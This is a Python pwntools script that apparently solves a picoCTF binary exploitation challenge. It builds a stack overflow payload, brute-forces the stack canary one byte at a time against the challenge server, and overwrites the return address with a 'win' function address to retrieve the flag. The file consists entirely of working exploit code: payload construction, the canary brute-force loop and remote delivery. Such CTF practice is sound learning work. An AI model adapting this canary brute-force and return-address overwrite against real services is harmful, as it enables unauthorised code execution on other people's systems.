from pwn import *
import sys

def reverse_str(str):
    chunks = [str[i:i+2] for i in range(0, len(str), 2)]

    chunks.reverse()

    hex_bytes = ['\\x' + chunk for chunk in chunks]
    return ''.join(hex_bytes)


def construct_payload(canary, canary_dist, addr="", ret_dist=0, encode=False):
    payload = 'A'*canary_dist
    payload += reverse_str(canary)
    payload += 'A'*ret_dist
    if addr !="":
        payload += reverse_str(addr)
    if encode:
        return payload.encode().decode('unicode_escape').encode('latin1')
    return payload


def send_to_server(payload):
    # Connect to the remote server
    host = 'saturn.picoctf.net'
    port = 57525
    conn = remote(host, port)

    conn.recvline()
    conn.recv()

    conn.sendline(str(len(payload)).encode())

    conn.recv()

    conn.sendline(payload)

    # Receive the server's response
    response = conn.recvall()
    # Close the connection
    conn.close()

    return response


def get_flag(output):
    index = output.find("picoCTF{")
    result = output[index:]  # substring from pattern to end
    return result


def execute():
    win_addr = "08049336"
    canary_dist = 64
    ret_dist = 16
    canary = "B____REDACTED____".encode()[::-1].hex()
    payload = construct_payload(canary, canary_dist, win_addr, ret_dist, True)
    server_output = send_to_server(payload)
    print(get_flag(server_output.decode('utf-8', errors='ignore')))


def find_canary():
    canary_dist = 64
    confirmed = ""
    for chr in "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz":
        canary = confirmed+chr
        payload = construct_payload(canary.encode()[::-1].hex(), canary_dist, encode=True)
        server_output = send_to_server(payload)
        print(canary + ": ", end="")
        print(server_output)


def generate_payload():
    win_addr = "08049336"
    canary = "pico".encode()[::-1].hex()
    canary_dist = 64
    ret_dist = 16
    payload = construct_payload(canary, canary_dist, win_addr, ret_dist)
    print(len(payload))
    print(payload)

def main():
    if(len(sys.argv) <=1):
        print("Please enter operation")
        sys.exit()
    operation=sys.argv[1]
    
    if operation == "payload":
        generate_payload()
    elif operation == "find":
        find_canary()
    elif operation == "execute":
        execute()
    else:
        print("Invalid operation")
main()
